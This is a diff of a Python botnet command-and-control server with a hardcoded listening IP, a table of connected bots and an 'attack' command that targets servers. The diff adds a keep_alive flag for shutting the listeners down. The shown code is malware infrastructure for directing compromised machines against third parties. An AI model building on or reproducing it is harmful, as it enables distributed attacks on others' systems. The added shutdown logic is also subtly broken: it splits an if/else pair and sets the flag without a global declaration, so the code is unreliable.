@@ -13,6 +13,8 @@ exec_command = "null"
 on_connect_exit = False
 test_bool = False
 
+keep_alive = True
+
 #def check_bot(addr):
 #    global botnet_address
 #    for add in botnet_address:
@@ -25,6 +27,10 @@ def start_confirmation_server(ip="159.65.11.28",port=2000):
     s.bind((ip,port))
     s.listen(5)
     while True:
+        global keep_alive
+        if(keep_alive != True):
+            s.close()
+            return
         client,addr = s.accept()
 
 
@@ -63,6 +69,10 @@ def start_server(port=2003,ip="159.65.11.28"):
     s.listen(5)
     print("\n[*] Server Started!\n")
     while True:
+        global keep_alive
+        if(keep_alive != True):
+            s.close()
+            return
         try:
             bot,addr = s.accept()
             if(botnet.get(str(addr[0]))):
@@ -315,6 +325,10 @@ def process_cmd(cmd):
                 attack_server(cmd.strip("attack "))
             # if(cmd == ""):
             #     pass
+
+            if "exit" in cmd:
+                keep_alive = False
+
             else:
                 pass
         except socket.error:
